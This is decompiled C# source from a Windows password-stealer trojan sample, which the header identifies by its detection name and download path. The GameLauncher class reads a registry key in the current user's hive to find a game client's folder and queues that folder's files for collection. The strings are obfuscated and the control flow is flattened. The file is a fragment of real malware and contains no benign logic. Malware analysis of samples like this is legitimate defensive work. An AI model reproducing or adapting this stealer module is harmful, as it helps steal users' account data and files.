// Decompiled with JetBrains decompiler
// Type: GameLauncher
// Assembly: Ajowans, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B9451E92-9872-44E9-A53B-32BF899B0E6F
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-PSW.Win32.Stealer.gen-ca27c07cc9fddcd8bc07b2b9aa3406ab019fb54797bf2163b190217e9c17ce6a.exe

using Ajowans;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;

public class GameLauncher : FileScanner
{
  public override string GetFolder(Entity16 scannerArg, FileInfo fileInfo)
  {
    try
    {
      string pathList1 = NodeConverter.RegisterFile((object) scannerArg);
      char[] pathList2 = new char[TemplateService.RegisterFile(3988)];
      // ISSUE: field reference
      DeviceManager.RegisterFile((Array) pathList2, __fieldref (VectorContext.namesEnabled));
      string generatorCache = TreeNodeType.RegisterFile(pathList2);
      if (SolutionSet.RegisterFile((object) pathList1, generatorCache))
      {
label_1:
        switch (6)
        {
          case 0:
            goto label_1;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (GameLauncher.GetFolder);
            }
            char[] pathList3 = new char[TemplateService.RegisterFile(3992)];
            // ISSUE: field reference
            DeviceManager.RegisterFile((Array) pathList3, __fieldref (VectorContext.namesEnabled));
            return TreeNodeType.RegisterFile(pathList3);
        }
      }
    }
    catch
    {
    }
    return string.Empty;
  }

  public override IEnumerable<Entity16> GetScanArgs()
  {
    List<Entity16> scanArgs = ConnectionTable.RegisterFile();
    try
    {
      RegistryKey currentUser = Microsoft.Win32.Registry.CurrentUser;
      char[] pathList1 = new char[TemplateService.RegisterFile(3996)];
      // ISSUE: field reference
      DeviceManager.RegisterFile((Array) pathList1, __fieldref (VectorContext.generatorCache));
      string generatorCache1 = TreeNodeType.RegisterFile(pathList1);
      RegistryKey registryKey = DiskSerializer.RegisterFile((object) currentUser, generatorCache1);
      if (registryKey == null)
      {
label_2:
        switch (7)
        {
          case 0:
            goto label_2;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (GameLauncher.GetScanArgs);
            }
            return (IEnumerable<Entity16>) scanArgs;
        }
      }
      else
      {
        RegistryKey pathList2 = registryKey;
        char[] pathList3 = new char[TemplateService.RegisterFile(4000)];
        // ISSUE: field reference
        DeviceManager.RegisterFile((Array) pathList3, __fieldref (VectorContext.namesEnabled));
        string generatorCache2 = TreeNodeType.RegisterFile(pathList3);
        string str = ImageManager.RegisterFile((object) pathList2, generatorCache2) as string;
        if (!EmulatorProvider.RegisterFile(str))
        {
label_7:
          switch (7)
          {
            case 0:
              goto label_7;
            default:
              return (IEnumerable<Entity16>) scanArgs;
          }
        }
        else
        {
          List<Entity16> pathList4 = scanArgs;
          Entity16 pathList5 = PluginAttribute.RegisterFile();
          Stub.RegisterFile((object) pathList5, str);
          Entity16 pathList6 = pathList5;
          char[] pathList7 = new char[TemplateService.RegisterFile(4004)];
          // ISSUE: field reference
          DeviceManager.RegisterFile((Array) pathList7, __fieldref (VectorContext.valuesMap));
          string generatorCache3 = TreeNodeType.RegisterFile(pathList7);
          ProcessFactory.RegisterFile((object) pathList6, generatorCache3);
          ActivitySite.RegisterFile((object) pathList5, TemplateService.RegisterFile(4008) != 0);
          Entity16 generatorCache4 = pathList5;
          TextFileService.RegisterFile((object) pathList4, generatorCache4);
          List<Entity16> pathList8 = scanArgs;
          Entity16 pathList9 = PluginAttribute.RegisterFile();
          Entity16 pathList10 = pathList9;
          string pathList11 = str;
          char[] pathList12 = new char[TemplateService.RegisterFile(4012)];
          // ISSUE: field reference
          DeviceManager.RegisterFile((Array) pathList12, __fieldref (VectorContext.namesEnabled));
          string generatorCache5 = TreeNodeType.RegisterFile(pathList12);
          string generatorCache6 = PaneList.RegisterFile(pathList11, generatorCache5);
          Stub.RegisterFile((object) pathList10, generatorCache6);
          Entity16 pathList13 = pathList9;
          char[] pathList14 = new char[TemplateService.RegisterFile(4016)];
          // ISSUE: field reference
          DeviceManager.RegisterFile((Array) pathList14, __fieldref (VectorContext.previousHandler));
          string generatorCache7 = PartitionHelper.RegisterFile((object) TreeNodeType.RegisterFile(pathList14), StreamProvider.RegisterFile(5213), string.Empty);
          ProcessFactory.RegisterFile((object) pathList13, generatorCache7);
          ActivitySite.RegisterFile((object) pathList9, TemplateService.RegisterFile(4020) != 0);
          Entity16 generatorCache8 = pathList9;
          TextFileService.RegisterFile((object) pathList8, generatorCache8);
        }
      }
    }
    catch
    {
    }
    return (IEnumerable<Entity16>) scanArgs;
  }
}
